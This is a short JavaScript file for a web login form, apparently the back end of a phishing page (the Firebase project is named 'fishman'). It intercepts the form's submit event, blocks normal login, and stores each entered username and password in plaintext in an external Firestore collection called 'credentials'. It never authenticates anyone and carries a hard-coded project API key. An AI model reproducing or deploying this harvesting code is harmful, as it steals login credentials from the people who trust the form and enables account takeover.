// Import the necessary Firebase modules
import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.12.1/firebase-app.js';
import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/9.12.1/firebase-firestore.js';

// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyABIbJenznGoBH3V_4V3eCUfSB2yFN2TS8",
  authDomain: "fishman-rb23.firebaseapp.com",
  projectId: "fishman-rb23",
  storageBucket: "fishman-rb23.appspot.com",
  messagingSenderId: "537342267563",
  appId: "1:537342267563:web:038a4dd39a07d7a24767ee"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Function to create a new document in the "credentials" collection
async function addCredential(username, password) {
  try {
    // Reference to the "credentials" collection
    const credCollection = collection(db, "credentials");

    // Add a new document with auto-generated ID
    await addDoc(credCollection, {
      user: username,
      pass: password
    });

    console.log("Credential added successfully.");
  } catch (error) {
    console.error("Error adding credential: ", error);
  }
}

// Wait for the DOM to load before accessing the form
document.addEventListener("DOMContentLoaded", () => {
  // Get a reference to the login form
  var loginForm = document.getElementById("login-form");

  // Add an event listener to the login form
  loginForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    // Check if the "credentials" collection exists and add the new document
    await addCredential(username, password);
  });
});
